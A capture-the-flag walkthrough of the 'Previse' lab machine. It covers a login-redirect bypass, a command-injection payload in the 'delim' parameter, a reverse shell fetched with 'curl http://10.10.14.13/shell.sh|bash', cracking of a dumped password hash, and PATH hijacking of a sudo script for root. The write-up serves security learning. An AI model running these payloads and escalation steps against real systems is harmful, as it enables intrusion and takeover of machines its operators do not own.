# Previse

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.95.185
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 11:41 EDT
Nmap scan report for 10.129.95.185
Host is up (0.0072s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### File Storage

Port 80 had a login page to some kind of file manager:

<figure><img src="../../../.gitbook/assets/image (2627).png" alt=""><figcaption></figcaption></figure>

This wasn't vulnerable to SQL Injection or anything. I tried visiting `index.php`, but was redirected back to the `login.php`. When the traffic is inspectedi nBurp, I noticed that `index.php` was still loaded.

<figure><img src="../../../.gitbook/assets/image (1087).png" alt=""><figcaption></figcaption></figure>

This means that we can view the pages without logging in since they are loaded before we are redirected. When I used Burp's Match and Replace function to change the 302 Found to 200 OK, I could load the page normally:

<figure><img src="../../../.gitbook/assets/image (2176).png" alt=""><figcaption></figcaption></figure>

Within the Accounts tab, we can add a user.

<figure><img src="../../../.gitbook/assets/image (2714).png" alt=""><figcaption></figcaption></figure>

So I created one and we can remove the Burpsuite filtering. Within the Files tab, there's a backup of the entire site uploaded.

<figure><img src="../../../.gitbook/assets/image (4042).png" alt=""><figcaption></figcaption></figure>

We can download this file and analyse the source code back on my machine. Here's the `logs.php`.

```php
<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";

if(file_exists($filepath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
}
?> 
```

It seems that there's an `exec` function used, and the `delim` parameter is not sanitised when being passed in, thus creating a command injection vulnerability. We can send this request to confirm we have RCE.

```http
POST /logs.php HTTP/1.1
Host: 10.129.95.185
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://10.129.95.185
Connection: close
Referer: http://10.129.95.185/file_logs.php
Cookie: PHPSESSID=k0vg9j4gs59e7q9qokpv6rhugi
Upgrade-Insecure-Requests: 1


delim=comma; ping -c 1 10.10.14.13 
```

<figure><img src="../../../.gitbook/assets/image (2586).png" alt=""><figcaption></figcaption></figure>

Now, we can get a reverse shell by using `curl http://10.10.14.13/shell.sh|bash`.&#x20;

<figure><img src="../../../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### M4lwhere Creds

Within the `/var/www/html` file, there's a `config.php` file.

```
www-data@previse:/var/www/html$ cat config.php 
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

We can login to the `mysql` database using these credentials. Within it, we can find the credentials for the file system.

```
mysql> select * from accounts\G
*************************** 1. row ***************************
        id: 1
  username: m4lwhere
  password: $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
created_at: 2021-05-27 18:18:36
*************************** 2. row ***************************
        id: 2
  username: test123
  password: $1$🧂llol$sP8qi2I.K6urjPuzdGizl1
created_at: 2023-05-06 09:26:49
2 rows in set (0.00 sec)
```

Using `hashcat`, we can crack this easily.&#x20;

```
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```

We can then `su` to `m4lwhere`.

<figure><img src="../../../.gitbook/assets/image (1885).png" alt=""><figcaption></figcaption></figure>

### Sudo Privileges

We can then enumerate `sudo` privileges.

```
m4lwhere@previse:/var/www/html$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

Here's the script:

```bash
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

This script was running `gzip` without the full path, so we can do some PATH injection. Create a script called `gzip` that makes `/bin/bash` an SUID binary via `chmod u+s /bin/bash`, then make it executable.&#x20;

Afterwards, change the PATH variable to include `/tmp` first and run the script as root.

```
m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh
```

It's easy to get a `root` shell afterwards.&#x20;

<figure><img src="../../../.gitbook/assets/image (1086).png" alt=""><figcaption></figcaption></figure>
